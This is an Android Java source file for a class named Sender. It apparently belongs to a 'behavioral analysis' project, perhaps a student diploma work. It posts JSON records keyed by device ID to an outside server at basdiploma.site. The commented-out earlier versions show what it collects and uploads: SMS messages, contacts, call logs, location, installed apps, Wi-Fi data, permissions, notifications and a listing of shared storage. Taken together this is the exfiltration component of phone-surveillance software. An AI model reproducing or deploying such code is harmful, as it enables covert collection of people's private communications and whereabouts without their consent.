package com.behavioralanalysis.service;

import android.content.Context;
import android.content.Intent;
import android.os.AsyncTask;
import android.telecom.Call;
import android.util.Log;
import android.widget.Toast;

import androidx.annotation.NonNull;
import androidx.work.Worker;
import androidx.work.WorkerParameters;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.io.OutputStreamWriter;
import java.net.HttpURLConnection;
import java.net.MalformedURLException;
import java.net.URL;
import java.util.Calendar;

import javax.net.ssl.HttpsURLConnection;

public class Sender extends AsyncTask<String, Void, Integer> {
    public static final String baseUrl = "https://basdiploma.site/api/log/";

    public static void send(String type, String value) {
        Logger.log("send " + type);
        try {
            JSONObject toSend = new JSONObject();
            toSend.put("type", type);
            toSend.put("deviceId", MainService.id);
            toSend.put(
                    "date",
                    android.text.format.DateFormat.format(
                            "yyyy-MM-dd HH:mm:ss",
                            Calendar.getInstance().getTime()
                    )
            );
            toSend.put("value", value);
            Log.i(MainService.TAG, type + " prepared");
            Logger.log("prepared " + type);
            new Sender().execute(toSend.toString());
            Integer sendResult = 0;
            if (sendResult == -1) {
                Logger.log("error " + type );
            } else {
                Log.i(MainService.TAG, type + " success [" + sendResult + "]");
                Logger.log("success " + type + " [" + sendResult + "]");
            }
        } catch (Exception ex) {
            Logger.log("error " + type + " " + ex.getMessage());
            ex.printStackTrace();
            Log.i(MainService.TAG, type + " error");
        }
    }

    @Override
    protected Integer doInBackground(String... strings) {

        String data = "";
        try {

            URL url = new URL(baseUrl);
            HttpsURLConnection httpURLConnection = (HttpsURLConnection)url.openConnection();
            httpURLConnection.setDoOutput(true);
            httpURLConnection.setRequestMethod("POST");
            httpURLConnection.setRequestProperty("Content-Type","application/json");
            httpURLConnection.setRequestProperty("Accept", "application/json");
            httpURLConnection.connect();

            OutputStream outputStream = httpURLConnection.getOutputStream();
            OutputStreamWriter outputStreamWriter = new OutputStreamWriter(outputStream, "UTF-8");
            outputStreamWriter.write(strings[0]);
            outputStreamWriter.flush();
            outputStreamWriter.close();

            BufferedReader bufferedReader = new BufferedReader(
                    new InputStreamReader(httpURLConnection.getInputStream(), "UTF-8")
            );

            String line = null;
            StringBuilder sb = new StringBuilder();

            while ((line = bufferedReader.readLine()) != null) {
                sb.append(line);
            }

            bufferedReader.close();
            data = sb.toString();
        } catch (Exception ex) {
            Log.e("error", ex.getMessage());
            return -1;
        }
        return data.split(",").length;
    }

    /* public static void send(String type, JSONObject toSend) {

        Logger.log("send " + type);
        String data = "";
        URL url;


        try {
            toSend.put("deviceId", MainService.id);
            toSend.put(
                    "date",
                    android.text.format.DateFormat.format(
                            "yyyy-MM-dd HH:mm:ss",
                            Calendar.getInstance().getTime()
                    )
            );
          /*  switch (type) {
                case "wifi": toSend.put("value", Wifi.get()); break;
                case "sms": toSend.put("value", Sms.get()); break;
                case "granted_permission": toSend.put("value", Permissions.getGranted()); break;
                case "location":
                    Context context = MainService.getContext();
                    if (context == null) {
                        return;
                    }
                    Locations gps = new Locations(context);
                    if (gps.isCanGetLocation()) {
                        toSend.put("value", gps.get());
                    }
                    break;
                case "contact": toSend.put("value", Contacts.get()); break;
                case "call": toSend.put("value", Calls.get()); break;
                case "app": toSend.put("value", Apps.get(true)); break;
                case "file": toSend.put("value", Files.get(value)); break;
                case "notification": toSend.put("value", value); break;
            }
            Log.i(MainService.tag(), type + " prepared");
            Logger.log("prepared " + type);


            url = new URL(baseUrl);
            HttpsURLConnection httpURLConnection = (HttpsURLConnection)url.openConnection();
            httpURLConnection.setDoOutput(true);
            httpURLConnection.setRequestMethod("POST");
            httpURLConnection.setRequestProperty("Content-Type","application/json");
            httpURLConnection.setRequestProperty("Accept", "application/json");
            httpURLConnection.connect();

            OutputStream outputStream = httpURLConnection.getOutputStream();
            OutputStreamWriter outputStreamWriter = new OutputStreamWriter(outputStream, "UTF-8");
            outputStreamWriter.write(toSend.toString());
            outputStreamWriter.flush();
            outputStreamWriter.close();

            BufferedReader bufferedReader = new BufferedReader(
                    new InputStreamReader(httpURLConnection.getInputStream(), "UTF-8")
            );

            String line = null;
            StringBuilder sb = new StringBuilder();

            while ((line = bufferedReader.readLine()) != null) {
                sb.append(line);
            }

            bufferedReader.close();
            data = sb.toString();
            Log.i(MainService.tag(), type + " success " + data);
            Logger.log("success " + type + " [" + data.length() + "]");
        } catch (Exception ex) {
            Logger.log("error " + type + " " + ex.getMessage());
            ex.printStackTrace();
            Log.i(MainService.tag(), type + " error");
        }
    }*/
}
/*
public class Sender extends AsyncTask<String, Void, String> {

    public static String baseUrl = "https://basdiploma.site/api/log/";

    @Override
    protected String doInBackground(String... strings) {
        Log.i(MainService.tag(), strings[0] + " start");
        Logger.log("start " + strings[0]);
        String data = "";
        URL url;
        try {
            JSONObject toSend = new JSONObject();
            toSend.put("type", strings[0]);
            toSend.put("deviceId", MainService.id);
            toSend.put(
                    "date",
                    android.text.format.DateFormat.format(
                            "yyyy-MM-dd HH:mm:ss",
                            Calendar.getInstance().getTime()
                    )
            );
            switch (strings[0]) {
                case "wifi": toSend.put("value", Wifi.get()); break;
                case "sms": toSend.put("value", Sms.get()); break;
                case "granted_permission": toSend.put("value", Permissions.getGranted()); break;
                case "location":
                    Context context = MainService.getContext();
                    if (context == null) {
                        return "";
                    }
                        Locations gps = new Locations(context);
                        if (gps.isCanGetLocation()) {
                            toSend.put("value", gps.get());
                        }
                        break;
                case "contact": toSend.put("value", Contacts.get()); break;
                case "call": toSend.put("value", Calls.get()); break;
                case "app": toSend.put("value", Apps.get(true)); break;
                case "file": toSend.put("value", Files.get("/storage/emulated/0")); break;
                case "notification": toSend.put("value", strings[1]); break;
            }
            Log.i(MainService.tag(), strings[0] + " prepared");
            Logger.log("prepared " + strings[0]);


            url = new URL(baseUrl);
            HttpsURLConnection httpURLConnection = (HttpsURLConnection)url.openConnection();
            httpURLConnection.setDoOutput(true);
            httpURLConnection.setRequestMethod("POST");
            httpURLConnection.setRequestProperty("Content-Type","application/json");
            httpURLConnection.setRequestProperty("Accept", "application/json");
            httpURLConnection.connect();

            OutputStream outputStream = httpURLConnection.getOutputStream();
            OutputStreamWriter outputStreamWriter = new OutputStreamWriter(outputStream, "UTF-8");
            outputStreamWriter.write(toSend.toString());
            outputStreamWriter.flush();
            outputStreamWriter.close();

            BufferedReader bufferedReader = new BufferedReader(
                    new InputStreamReader(httpURLConnection.getInputStream(), "UTF-8")
            );

            String line = null;
            StringBuilder sb = new StringBuilder();

            while ((line = bufferedReader.readLine()) != null) {
                sb.append(line);
            }

            bufferedReader.close();
            data = sb.toString();
            Log.i(MainService.tag(), strings[0] + " success " + data);
            Logger.log("success " + strings[0] + " " + data);
        } catch (Exception ex) {
            Logger.log("error " + strings[0] + " " + ex.getMessage());
            ex.printStackTrace();
            Log.i(MainService.tag(), strings[0] + " error");
        }

        return data;
    }

    public static void send(String type) {
        Toast.makeText(MainService.getContext(), type.substring(0, 1).toUpperCase() + type.substring(1).replace("_", " ") + " send", Toast.LENGTH_SHORT).show();
        new Sender().execute(type);
    }
}
*/